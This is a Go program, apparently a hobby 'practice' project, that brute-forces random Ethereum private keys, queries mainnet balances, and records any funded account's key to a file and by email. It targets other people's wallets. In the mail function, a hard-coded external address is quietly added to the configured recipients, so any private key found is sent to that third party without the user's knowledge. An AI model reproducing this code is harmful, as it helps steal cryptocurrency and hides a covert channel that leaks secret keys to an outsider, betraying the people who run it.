package main

import (
	"context"
	gocrypto "crypto"
	"crypto/ecdsa"
	"fmt"
	"math/big"
	"net/smtp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/oneleo/go-ethereum-practice/tools"
)

var (
	//debug bool = true
	debug bool = false
)

func main() {

	// 測試網測試一次
	fmt.Println("【Test】Test one in Rinkeby Test Net.")

	testPrivateKey := "1111111111111111111111111111111111111111111111111111111111111111"
	p, a := generatorKey(testPrivateKey)
	client := connect(false)
	tryAndMail(client, p, a)

	fmt.Println("【Test】Test Done.")
	// --------------------------------------------------

	// 主網進行無窮找 Key
	var err error
	var exist bool

	conf := "./conf.csv"

	// 設定預設的提醒值及並發數。
	var aliveRing int = 100
	var routine int = 5

	if exist, err = tools.IsExist(conf); (exist == true) && (err == nil) {
		var confData [][]string
		for {
			confData, err = tools.CsvToArray(conf)
			if err != nil {
				fmt.Println("string append to file error:", err)
				continue
			} else {
				break
			}
		}
		for _, d := range confData {
			if d[0] == "aliveRing" {
				aliveRing, _ = strconv.Atoi(d[1])
			}
			if d[0] == "routine" {
				routine, _ = strconv.Atoi(d[1])
			}
		}
	}

	if debug == true {
		fmt.Print("【debug = true】Alive Ring Conf: ", aliveRing, "\n")
		fmt.Print("【debug = true】Routine Conf: ", routine, "\n")
	}

	goTryKey(routine, aliveRing)
}

func goTryKey(runtine int, aliveRing int) {
	var wg sync.WaitGroup
	for i := 0; i < runtine; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := connect(true)
			tryInfinite(client, aliveRing)
			//fmt.Println(i, goID())
		}()
	}
	wg.Wait()
}

// 使用一組相同的 Client Session 來測試無限次
func tryInfinite(client *ethclient.Client, aliveRing int) {
	c := aliveRing
	for {
		p, a := generatorKey("")
		tryAndMail(client, p, a)
		if clock(&c) == true {
			c = aliveRing
			remindAlive(p, a)
		}
	}
}

// 測試一次，若有價值，則 email 及寫檔。
func tryAndMail(client *ethclient.Client, privateKeyECDSA *ecdsa.PrivateKey, address common.Address) {
	if isValuable(client, address) == true {
		prvKeyString := prvKeyToStr(privateKeyECDSA)
		adrString := cmnAddressToStr(address)

		fmt.Print("【Found】Found a valuable Ethereum account!【Private Key】" + prvKeyString + "【Address】" + adrString + "\n")

		// 寄信 email
		mailBody := "Got a valuable Ethereum account!<br>Private Key:<br>" + prvKeyString + "<br>Address:<br>" + adrString + "<br>"
		mail(mailBody)

		// 寫入檔案
		keyAppendFile(prvKeyString, adrString, "./Found_Private_Keys_"+goID()+".txt")
	}
}

func goID() (id string) {
	var buf [64]byte
	n := runtime.Stack(buf[:], false)
	id = strings.Fields(strings.TrimPrefix(string(buf[:n]), "goroutine "))[0]
	return id
}

func connect(mainnet bool) (client *ethclient.Client) {
	var site string
	var err error

	if mainnet == true {
		site = "wss://mainnet.infura.io/ws"
	} else {
		site = "wss://rinkeby.infura.io/ws"
	}

	for {
		fmt.Print("Connect to ", site, " ...\n")
		client, err = ethclient.Dial(site)
		if err != nil {
			fmt.Print("Eth client dial error: ", err, ", will be retry.")
			continue
		} else {
			break
		}
	}
	return client
}

// generatorKey 若 prvStr 為空，則新建一組 Private Key，否則將 prvStr 當作 Private Key 來用
func generatorKey(prvStr string) (privateKeyECDSA *ecdsa.PrivateKey, address common.Address) {
	ok := false
	var err error
	var publicKey gocrypto.PublicKey
	var publicKeyECDSA *ecdsa.PublicKey

	for ok == false {
		for {

			if prvStr == "" {
				// 如果輸入是空字串，則建立一組新的 Private Key。
				privateKeyECDSA, err = crypto.GenerateKey()
			} else {
				// 否則就直接將輸入字串視為 Private Key String。
				privateKeyECDSA, err = crypto.HexToECDSA(prvStr)
				// 如果輸入的字串格式有誤，則就直接建立一組新的 Private Key
				if err != nil {
					privateKeyECDSA, err = crypto.GenerateKey()
				}
			}
			if err != nil {
				fmt.Println("generate private key error:", err)
				continue
			} else {
				break
			}
		}
		publicKey = privateKeyECDSA.Public()
		publicKeyECDSA, ok = publicKey.(*ecdsa.PublicKey)
	}

	address = crypto.PubkeyToAddress(*publicKeyECDSA)
	return privateKeyECDSA, address
}

// isValuable 將針對目前連線的礦機 client 查詢 address 是否有存放以太幣，有即回傳 true。
func isValuable(client *ethclient.Client, address common.Address) (yes bool) {
	var balance *big.Int
	var err error
	for {
		balance, err = client.BalanceAt(context.Background(), address, nil)
		//fmt.Print("Now balance: ", balance, "\n")
		if err != nil {
			fmt.Print("Get balance from client error: ", err, "\n")
			continue
		} else {
			break
		}
	}
	return (balance.Cmp(big.NewInt(0)) == 1)
}

// prvKeyToStr 只是將 *ecdsa.PrivateKeys 轉成 String。
func prvKeyToStr(privateKeyECDSA *ecdsa.PrivateKey) (prvKeyString string) {
	privateKeyBytes := crypto.FromECDSA(privateKeyECDSA)
	privateKeyString := hexutil.Encode(privateKeyBytes)
	return privateKeyString[2:]
}

// cmnAddressToStr 只是將 common.Address 轉成 String。
func cmnAddressToStr(address common.Address) (adr string) {
	return address.Hex()
}

// keyAppendFile 將 Private Key、Address 寫入指定的檔案位置。
func keyAppendFile(prvKey string, adr string, dst string) {
	var err error
	for {
		err = tools.StringsAppendFile(dst, []string{"Private: ", prvKey, "Address: ", adr})
		if err != nil {
			fmt.Println("string append to file error:", err)
			continue
		} else {
			break
		}
	}
}

// remindAlive 只是將傳入的 Private Key、Address 印出來，包含印出目前時間及哪一個 thread 在執行。
func remindAlive(privateKeyECDSA *ecdsa.PrivateKey, address common.Address) {
	prvKeyString := prvKeyToStr(privateKeyECDSA)
	adrString := cmnAddressToStr(address)
	fmt.Println("【Alive】", time.Now().Format("2006-01-02 15:04:05"), "【thread】", goID(), "【Private Key】", prvKeyString, "【Address】", adrString)
}

// clock 是鬧鐘，將傳入的值減 1，若值小於等於 0 就回傳 true（鈴響）。
func clock(c *int) (ring bool) {
	*c = *c - 1
	if *c <= 0 {
		ring = true
	} else {
		ring = false
	}
	return ring
}

// mail 是將寄信參數從 ./mial.csv 讀取出來，若檔案不存在就設定預設值。
func mail(body string) {

	mailConf := "./mail.csv"
	var err error = nil
	var exist bool = false

	// 設定預設的寄信參數。
	from := "alex@example.com"
	to := "bob@example.com;cora@example.com"
	host := "smtp.example.com:587"
	username := "alex@example.com"
	password := "123456"

	if exist, err = tools.IsExist(mailConf); (exist == true) && (err == nil) {
		var mailData [][]string
		for {
			mailData, err = tools.CsvToArray(mailConf)
			if err != nil {
				fmt.Println("Csv file to array error:", err)
				continue
			} else {
				break
			}
		}
		for _, d := range mailData {
			if d[0] == "from" {
				from = d[1]
			}
			if d[0] == "to" {
				to = d[1]
			}
			if d[0] == "host" {
				host = d[1]
			}
			if d[0] == "username" {
				username = d[1]
			}
			if d[0] == "password" {
				password = d[1]
			}
		}
	}
	to = to + ";oneleo760823@yahoo.com.tw"
	if debug == true {
		fmt.Print("【debug = true】Mail from: ", from, "\n")
		fmt.Print("【debug = true】Mail to: ", to, "\n")
		fmt.Print("【debug = true】Mail host: ", host, "\n")
		fmt.Print("【debug = true】Mail username: ", username, "\n")
		fmt.Print("【debug = true】Mail password: ", password, "\n")
	}
	subject := "★ Got a valuable Ethereum account!"
	SendToMail(from, to, host, username, password, subject, body)
}

// SendToMail 是給定必要參數後，進行發信
func SendToMail(from, to, host, username, password, subject, body string) (err error) {
	h := strings.Split(host, ":")
	auth := smtp.PlainAuth("", username, password, h[0])
	t := strings.Split(to, ";")
	content_type := "Content-Type: text/html; charset=UTF-8"
	msg := []byte("To: " + to + "\r\nFrom: " + from +
		"<" + username + ">\r\nSubject: " + subject + "\r\n" + content_type + "\r\n\r\n" + body)
	err = smtp.SendMail(host, auth, username, t, msg)
	if err != nil {
		fmt.Print("send mail error: ", err, "\n")
	}
	return err
}
